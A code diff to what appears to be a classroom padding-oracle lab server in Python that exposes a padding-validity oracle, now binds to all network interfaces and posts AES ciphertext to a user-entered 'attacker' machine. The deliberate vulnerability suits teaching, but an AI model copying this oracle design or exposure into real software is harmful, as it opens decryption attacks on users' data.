@@ -7,6 +7,7 @@ Exposes /oracle on port 5000 — only answers "is padding valid?" (yes/no).
 """
 
 import os
+import socket
 import threading
 import logging
 from flask import Flask, request, jsonify
@@ -17,8 +18,9 @@ import requests as http_req
 # --- Hardcoded values ---
 BLOCK_SIZE = 16                        # AES block size: 16 bytes (128 bits)
 KEY = os.urandom(16)                   # AES-128 key: 16 bytes, random each run
+SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5000
-ATTACKER_URL = "http://127.0.0.1:5001/capture"
+ATTACKER_PORT = 5001
 
 app = Flask(__name__)
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
@@ -27,6 +29,18 @@ logging.getLogger("werkzeug").setLevel(logging.ERROR)
 def fmt(data):
     """Format bytes as space-separated decimal values."""
     return " ".join(str(b) for b in data)
+
+
+def get_local_ip():
+    """Best-effort LAN IP discovery for same-Wi-Fi testing."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        sock.connect(("8.8.8.8", 80))
+        return sock.getsockname()[0]
+    except OSError:
+        return "127.0.0.1"
+    finally:
+        sock.close()
 
 
 @app.route("/oracle", methods=["POST"])
@@ -60,7 +74,14 @@ def oracle():
 
 
 def main():
-    t = threading.Thread(target=lambda: app.run(host="127.0.0.1", port=SERVER_PORT, threaded=True), daemon=True)
+    local_ip = get_local_ip()
+    attacker_ip = input("Enter attacker PC IP (blank for localhost): ").strip() or "127.0.0.1"
+    attacker_url = f"http://{attacker_ip}:{ATTACKER_PORT}/capture"
+
+    t = threading.Thread(
+        target=lambda: app.run(host=SERVER_HOST, port=SERVER_PORT, threaded=True),
+        daemon=True,
+    )
     t.start()
 
     print("=" * 50)
@@ -70,7 +91,9 @@ def main():
     print(f"  Block size : {BLOCK_SIZE} bytes")
     print(f"  Padding    : PKCS#7")
     print(f"  Key        : {fmt(KEY)}")
-    print(f"  Oracle     : http://127.0.0.1:{SERVER_PORT}/oracle")
+    print(f"  This PC IP : {local_ip}")
+    print(f"  Oracle     : http://{local_ip}:{SERVER_PORT}/oracle")
+    print(f"  Attacker   : {attacker_url}")
     print("=" * 50)
     print()
 
@@ -106,7 +129,7 @@ def main():
 
         # send to attacker (hex is only used over the network, not shown to user)
         try:
-            http_req.post(ATTACKER_URL, json={"ciphertext": (iv+ct).hex()}, timeout=3)
+            http_req.post(attacker_url, json={"ciphertext": (iv+ct).hex()}, timeout=3)
             print(f"Status          : Sent to attacker")
         except Exception:
             print(f"Status          : Attacker not running")
